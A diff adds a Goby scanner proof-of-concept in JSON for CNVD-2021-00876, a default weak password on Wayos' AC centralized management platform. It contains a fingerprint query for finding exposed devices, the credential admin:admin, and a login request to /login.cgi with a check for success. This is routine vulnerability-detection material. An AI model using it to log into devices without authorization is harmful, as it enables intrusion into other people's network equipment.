@@ -1,0 +1,55 @@
+{
+      "Name": "Wayos AC集中管理系统默认弱口令  CNVD-2021-00876",
+      "Level": "2",
+      "Tags": [
+            "弱口令"
+      ],
+      "GobyQuery": "title=\"AC集中管理平台\" && body=\"login_25.jpg\"",
+      "Description": "深圳维盟科技股份有限公司是国内领先的网络设备及智能家居产品解决方案供应商，主营产品包括无线网关、交换机、国外VPN、双频吸顶ap等。\n\nAC集中管理平台存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。\n弱口令  admin:admin",
+      "Product": "深圳维盟科技股份有限公司AC集中管理平台",
+      "Homepage": "http://www.wayos.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/login.cgi",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "user=admin&password=admin"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": "flag=0",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-02-07 23:13:20",
+      "GobyVersion": "1.8.237"
+}
